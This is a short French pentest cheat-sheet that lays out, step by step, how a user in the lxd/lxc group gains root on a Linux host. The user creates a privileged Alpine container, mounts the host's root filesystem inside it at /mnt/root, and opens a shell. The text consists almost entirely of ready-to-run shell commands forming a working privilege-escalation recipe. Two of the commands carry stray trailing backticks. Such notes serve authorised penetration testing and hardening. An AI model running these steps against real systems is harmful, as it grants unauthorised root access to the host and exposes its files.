Si notre utilisateur est membre du groupe lxd / lxc, il est possible de créer un conteneur. Cela nous donne la possibilité d'être root sur ce conteneur, de monter la racine de l'host à l'intérieur du conteneur et donc de le lire avec les droits root.

#### 💾 Télécharger une image de conteneur Alpine Linux :

```bash
wget https://dl-cdn.alpinelinux.org/alpine/v3.17/releases/x86_64/alpine-minirootfs-3.17.1-x86_64.tar.gz
```

#### 🚀 Initialiser LXD au besoin:

```bash
lxd init
```

#### 📝 Importer l'image Alpine comme une image LXC :

```bash
lxc image import alpine-minirootfs-3.17.1-x86_64.tar.gz --alias alpine
```
 
#### 🛫 Lancer un conteneur Alpine avec des privilèges élevés :

```bash
lxc init alpine r00t -c security.privileged=true`
```

#### 🥞 Monter le disque de l'hôte dans le conteneur :

```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`
```

#### 🐚 Accéder au shell dans le conteneur :

```bash
lxc start r00t
lxc exec r00t /bin/sh
```

